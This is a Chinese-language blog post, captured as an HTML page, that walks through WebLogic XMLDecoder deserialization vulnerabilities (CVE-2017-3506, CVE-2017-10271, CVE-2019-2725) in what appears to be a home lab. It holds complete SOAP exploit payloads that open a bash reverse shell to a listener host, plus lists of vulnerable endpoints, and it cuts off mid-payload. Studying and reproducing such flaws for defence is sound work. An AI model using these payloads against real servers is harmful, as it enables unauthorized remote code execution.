@@ -1,0 +1,1206 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Weblogic反序列化漏洞, xmhhmx的blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Weblogic反序列化漏洞 | xmhhmx的blog</title>
+    <link rel="icon" type="image/png" href="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">xmhhmx的blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">xmhhmx的blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Weblogic反序列化漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2025-04-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2025-05-06
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    5k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h1><h2 id="WeblogicXMLdecoder反序列化"><a href="#WeblogicXMLdecoder反序列化" class="headerlink" title="WeblogicXMLdecoder反序列化"></a>WeblogicXMLdecoder反序列化</h2><h3 id="1-XMLDecode-反序列化"><a href="#1-XMLDecode-反序列化" class="headerlink" title="1. XMLDecode 反序列化"></a>1. XMLDecode 反序列化</h3><h4 id="1-1-XMLEncoder-XMLDecoder"><a href="#1-1-XMLEncoder-XMLDecoder" class="headerlink" title="1.1 XMLEncoder&amp;XMLDecoder"></a>1.1 XMLEncoder&amp;XMLDecoder</h4><p>XMLDecoder/XMLEncoder是在JDK1.4版中添加的XML格式序列化持久性方案，使用XMLEncoder来生成表示JavaBeans组件(bean)的XML文档，用XMLDecoder读取使用XMLEncoder创建的XML文档获取JavaBeans。</p>
+<h4 id="1-2-XML标签"><a href="#1-2-XML标签" class="headerlink" title="1.2 XML标签"></a>1.2 XML标签</h4><ol>
+<li>string标签</li>
+</ol>
+<p>​		字符串“Hello,world”表示如下:</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>object标签</li>
+</ol>
+<p>​		通过<object>标签表示对象，其class属性指定具体类(用于调用其内部方法)，method属性指定具体方法名称(比如构造函数的的方法名为 new )。<p></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">"Hello,worIld"</span>);		<span class="comment">//等价于 JButton jb = new JButton("Hello,worIld");</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>对应的XML文档如下:</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"javax.swing.JButton"</span> <span class="attr">method</span>=<span class="string">"new"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="3">
+<li>void标签</li>
+</ol>
+<p>​		通过<void>标签表示函数调用、赋值等操作，method属性指定具体的方法名称。</void></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JButton</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>();</span><br><span class="line">b.setText(<span class="string">"Hello, worId"</span>); </span><br></pre></td></tr></tbody></table></figure>
+
+<p>对应的XML文档如下:</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"javax.swing.JButton"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"setText"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>4.array标签<br>通过<array>标签表示数组，class属性指定具体类，在array标签内部使用void标签的index属性来指定数组索引赋值。</array></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">2</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">"Hello,world"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对应的XML文档如下:</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">1ength</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="1-3-WeblogicXMLdecoder反序列化实例"><a href="#1-3-WeblogicXMLdecoder反序列化实例" class="headerlink" title="1.3 WeblogicXMLdecoder反序列化实例"></a>1.3 WeblogicXMLdecoder反序列化实例</h4><p>XML文档：</p>
+<p>java头指定java版本和使用的XMLDecoder类，用来进行xml文档反序列化</p>
+<p>object对象指定创建进程的类（ProcessBuilder），可以用于命令执行</p>
+<p>array数组长度为1，传入的值为calc（计算器）</p>
+<p>然后再调用start方法</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(s[<span class="number">0</span>]);</span><br><span class="line">String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">0</span>] = <span class="string">"calc"</span>;</span><br><span class="line">pb.start();</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6808ece858cb8da5c8c6a5f6.png"></p>
+<p>Test.java：</p>
+<p><img src="https://pic1.imgdb.cn/item/6808ed5c58cb8da5c8c6a610.png"></p>
+<p>把poc.xml的xml文档传入，调用a.readObject反序列化成对象，然后运行系统命令，弹出计算器</p>
+<h3 id="2-CVE-2017-3506-xml数据无校验"><a href="#2-CVE-2017-3506-xml数据无校验" class="headerlink" title="2. CVE-2017-3506(xml数据无校验)"></a>2. CVE-2017-3506(xml数据无校验)</h3><h4 id="2-1-漏洞简介"><a href="#2-1-漏洞简介" class="headerlink" title="2.1 漏洞简介"></a>2.1 漏洞简介</h4><p>​		WebLogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的SOAP(XML)数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+<p>影响版本：10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2</p>
+<h4 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h4><h5 id="2-2-1-判断漏洞存在"><a href="#2-2-1-判断漏洞存在" class="headerlink" title="2.2.1 判断漏洞存在"></a>2.2.1 判断漏洞存在</h5><p>若访问/wls-wsat/CoordinatorPortType，出现如下页面，则可能存在此漏洞。</p>
+<p><img src="https://pic1.imgdb.cn/item/6808f95858cb8da5c8c6aa9d.png"></p>
+<p>只要在wls-wsat这个war包中的uri皆受到影响，打开web.xml查看所有受到影响的uri路径。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">默认受到影响的uri如下：</span><br><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h4><p>​		访问<a target="_blank" rel="noopener" href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST，而后修改</a> Content-Type为text/xml。</p>
+<p>在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xm1ns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">1ength</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.219.134/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：反弹shell命令中的&gt;&amp;转换成了实体编码&amp;gt;&amp;amp;</strong></p>
+<p>在kali中使用nc监听4444端口。</p>
+<h3 id="3-CVE-2017-10271（黑名单过滤object标签，void标签绕过）"><a href="#3-CVE-2017-10271（黑名单过滤object标签，void标签绕过）" class="headerlink" title="3. CVE-2017-10271（黑名单过滤object标签，void标签绕过）"></a>3. CVE-2017-10271（黑名单过滤object标签，void标签绕过）</h3><h4 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h4><p>​		在更新CVE-2017-3506补丁之前，不对用户输入的SOAP(XML)数据进行验证，在其中使用object标签就可以进行远程命令执行，CVE-2017-3506的补丁在weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法，在解析xml时，Element字段出现object标签就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式与CVE-2017-3506类似，使用了void标签绕过CVE-2017-3506的补丁，从而进行远程命令执行。</p>
+<p>影响版本:10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2</p>
+<h4 id="3-2-漏洞复现"><a href="#3-2-漏洞复现" class="headerlink" title="3.2 漏洞复现"></a>3.2 漏洞复现</h4><p>​		CVE-2017-10271与CVE-2017-3506的复现过程相似,只不过**<u>需要将objec标签替换成void</u>**进行利用。访问<a target="_blank" rel="noopener" href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST,%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9Content-Type%E4%B8%BAtext/xml%E3%80%82">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST,而后修改Content-Type为text/xml。</a><br>​		在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.219.134/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在kali中使用nc监听4444端口。</p>
+<h5 id="3-2-1-复现过程"><a href="#3-2-1-复现过程" class="headerlink" title="3.2.1 复现过程"></a>3.2.1 复现过程</h5><p>访问网页，出现此页面，表示存在漏洞</p>
+<p><img src="https://pic1.imgdb.cn/item/6809070158cb8da5c8c6b5dd.png"></p>
+<p>bp抓包，修改请求方法为POST，而后修改Content-Type为text/xml，然后写入payload</p>
+<p>原始包：</p>
+<p><img src="https://pic1.imgdb.cn/item/680907aa58cb8da5c8c6b6b5.png"></p>
+<p>修改后包：</p>
+<p><img src="https://pic1.imgdb.cn/item/680908b158cb8da5c8c6b753.png"></p>
+<p>响应包返回500</p>
+<p>kali上开启监听4444端口，并收到反弹的shell</p>
+<p><img src="https://pic1.imgdb.cn/item/680908ff58cb8da5c8c6b78c.png"></p>
+<h3 id="4-CVE-2019-2725（新路径，依旧无校验）"><a href="#4-CVE-2019-2725（新路径，依旧无校验）" class="headerlink" title="4. CVE-2019-2725（新路径，依旧无校验）"></a>4. CVE-2019-2725（新路径，依旧无校验）</h3><h4 id="4-1-漏洞介绍"><a href="#4-1-漏洞介绍" class="headerlink" title="4.1 漏洞介绍"></a>4.1 漏洞介绍</h4><p>该漏洞依l日是根据weblogic的xmldecoder反序列化漏洞，WebLogic部分版本中默认包含wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意HTTP请求，获得目标服务器的权限，在未授权的情况下远程执行命令。</p>
+<p>影响版本:10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0</p>
+<h4 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h4><p>CVE-2019-2725漏洞与前两个漏洞相似，只不过利用的是wIs9_async_response这个war包，若访问/_async/AsyncResponseService，响应如下页面，则可能存在该漏洞。</p>
+<p><img src="https://pic1.imgdb.cn/item/68090e4258cb8da5c8c6bac3.png"></p>
+<p>若访问/_async/，响应403，也可能存在漏洞。</p>
+<p><img src="https://pic1.imgdb.cn/item/68090e5858cb8da5c8c6bac5.png"></p>
+<p>只要是在bea_wls9_async_response包中的uri皆受到影响，可以打开web.xml查看所有受到影响的uri。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认受影响的uri：</span><br><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttp</span><br><span class="line">返回页面均为上面的页面</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="4-3-漏洞复现"><a href="#4-3-漏洞复现" class="headerlink" title="4.3 漏洞复现"></a>4.3 漏洞复现</h4><p>​		CVE-2017-10271与前面的两个漏洞复现过程相似,利用点在bea_wIs9_async_response包中的uri。访问<a target="_blank" rel="noopener" href="http://192.168.219.185:7001/async/AsyncResponseService%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST,%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9Content-Type%E4%B8%BAtext/xml%E3%80%82">http://192.168.219.185:7001/async/AsyncResponseService，而后使用brup拦截该请求，修改请求方法为POST,而后修改Content-Type为text/xml。</a><br>​		在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span><span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span 